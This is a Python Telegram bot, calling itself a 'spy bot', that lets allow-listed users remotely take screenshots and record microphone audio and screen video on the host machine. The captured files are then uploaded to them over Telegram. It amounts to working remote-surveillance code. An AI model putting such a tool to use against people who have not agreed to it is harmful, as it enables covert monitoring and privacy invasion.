import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from utils import * #
from threading import Timer




class RepeatTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)

# remind the user when a long recording in progress
class Reminder:
    def __init__(self):
        self.timeOut = 60*10 # interval to notify the user
        self.timer = None
        self.userid = None
        self.message = None

    def remind(self, userid):
        self.userid = userid
        self.timer = RepeatTimer( self.timeOut, self.nudge)
        self.timer.start()
        

    def nudge(self):
        if self.message:
            bot.delete_message(self.message.chat.id, self.message.message_id)
        self.message = bot.send_message(self.userid, "Recording in progress. Don't forget to finish")

    def cancel(self):
        self.message = None
        self.userid = None
        self.timer.cancel()

remind = Reminder()







TOKEN = getEnv('TOKEN')
ALLOWED_USERS=getEnv('ALLOWED_USERS', cast=int, isList=True)
ASSETS_DIR = 'assets'

if not os.path.exists(ASSETS_DIR): os.makedirs(ASSETS_DIR)
removeFile('ffmpeg.log')


bot= telebot.TeleBot(TOKEN, parse_mode='HTML')
audioRecorder = AudioRecorder()
videoRecorder = VideoRecorder()






@bot.message_handler(commands='start')
def send_welcome(message):
    user = message.from_user.id
    response = "Welcome to the spy bot" if user in ALLOWED_USERS \
         else "You are not authorized to use this bot"
    return bot.send_message(user, response)




@bot.message_handler(commands='photo')
def send_screenshot(message):
    user = message.from_user.id
    if videoRecorder.isRunning():
        bot.send_message(user, "Video recording is in progress. Can't capture photo")
        return

    if user not in ALLOWED_USERS : return
    fileName = os.path.join(ASSETS_DIR,f"ScreenShot_{timeStamp()}.jpg")
    
    message = bot.send_message(message.from_user.id, "Wait while the bot takes the photo")
    takeScreenShot(fileName)
    with open(fileName,'rb') as f:
        bot.send_photo(user, f)
    bot.delete_message(message.chat.id, message.message_id)





@bot.message_handler(commands='audio')
def send_audio(message):
    user = message.from_user.id
    if user not in ALLOWED_USERS : return
    if audioRecorder.isRunning(): 
        bot.send_message(user, "Recording already in progress.")
    else:
        audioRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=audioMarkup())
        remind.remind(user)


def audioMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_audio"),
                InlineKeyboardButton("Cancel", callback_data="cb_cancel_audio"))
    return markup





@bot.message_handler(commands='videoonly')
def send_video(message):
    user = message.from_user.id
    if user not in ALLOWED_USERS : return
    if videoRecorder.isRunning(): 
        bot.send_message(user, "Recording already in progress.")
    else:
        videoRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=videoOnlyMarkup())
        remind.remind(user)



def videoOnlyMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_videoonly"),
                InlineKeyboardButton("Cancel", callback_data="cb_cancel_videoonly"))
    return markup





@bot.message_handler(commands='video')
def send_both(message):
    user = message.from_user.id
    if user not in ALLOWED_USERS : return
    if videoRecorder.isRunning() or audioRecorder.isRunning(): 
        bot.send_message(user, "Recording already in progress.")
    else:
        audioRecorder.start()
        videoRecorder.start()
        bot.send_message(user, "Recording in progress.", reply_markup=videoMarkup())
        remind.remind(user)




def videoMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_video"),
                InlineKeyboardButton("Cancel", callback_data="cb_cancel_video"))
    return markup






@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    # clear all reminder
    remind.cancel()
    bot.edit_message_reply_markup(message_id=call.message.id, chat_id=call.message.chat.id, reply_markup=None)
    if call.data == "cb_stop_audio":
        if not audioRecorder.isRunning():
            bot.send_message("No recording is currently in progress !!!")
            return
        message = bot.send_message(call.from_user.id, "Processing please wait")

        file =os.path.join(ASSETS_DIR, f"Audio_{timeStamp()}.wav")
        audioRecorder.stop(file)
        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        message = bot.send_message(call.from_user.id, "Wait while the bot uploads the audio")

        with open(file,'rb') as f:
            bot.send_audio(call.from_user.id, f)
        bot.delete_message(message.chat.id, message.message_id)

    elif call.data == "cb_cancel_audio":
        # break if fail, don't send message again
        audioRecorder.stop()
        bot.send_message(call.from_user.id, "Recording terminated")


    #------------------------------------------------------------------------


    elif call.data == "cb_stop_videoonly":
        if not videoRecorder.isRunning():
            bot.send_message("No recording is currently in progress !!!")
            return
        message = bot.send_message(call.from_user.id, "Processing please wait")

        file =os.path.join(ASSETS_DIR, f"Video_{timeStamp()}.avi")
        fileO =file.replace('avi','mp4')
        eFPS = videoRecorder.stop(file)

        # convert to mp4, smaller file size, playable inside telegram
        reFFMPEG(file, eFPS, fileO, videoRecorder.fps)
        # reMoviePy(file, 'mv'+file.replace('avi','mp4'), videoRecorder.fps)


        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        message = bot.send_message(call.from_user.id, "Wait while the bot uploads the video")

        with open(fileO,'rb') as f:
            bot.send_video(call.from_user.id, f)
        bot.delete_message(message.chat.id, message.message_id)

    elif call.data == "cb_cancel_videoonly":
        # break if fail, don't send message again
        videoRecorder.stop()
        bot.send_message(call.from_user.id, "Recording terminated")


    #-----------------------------------------------------------------

    elif call.data == "cb_stop_video":
        if not audioRecorder.isRunning() or not videoRecorder.isRunning():
            bot.send_message("No recording is currently in progress !!!")
            return
        message = bot.send_message(call.from_user.id, "Processing please wait")
        audFile =os.path.join(ASSETS_DIR, 'audioTmp.wav')
        vidFile = os.path.join(ASSETS_DIR, 'videoTmp.avi')
        removeFile(audFile, vidFile)
        fileO =os.path.join(ASSETS_DIR, f"Video_{timeStamp()}.mp4")
        audioRecorder.stop(audFile)
        eFPS = videoRecorder.stop(vidFile)


        #merging audio and video
        #WARNING: Problem with syncing
        tmpFile = fileO.replace('.mp4','_tmp.mp4')
        reFFMPEG(vidFile, eFPS, tmpFile, videoRecorder.fps)
        mergeFFMPEG(tmpFile,audFile, fileO)
        # mergeMoviePy(vidFile, audFile, 'mv_out.mp4', videoRecorder.fps)


        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        message = bot.send_message(call.from_user.id, "Wait while the bot uploads the video")
        with open(fileO,'rb') as f:
            bot.send_video(call.from_user.id, f)
        bot.delete_message(message.chat.id, message.message_id)


    elif call.data == "cb_cancel_video":
        # break if fail, don't send message again
        videoRecorder.stop()
        audioRecorder.stop()
        bot.send_message(call.from_user.id, "Recording terminated")





bot.infinity_polling()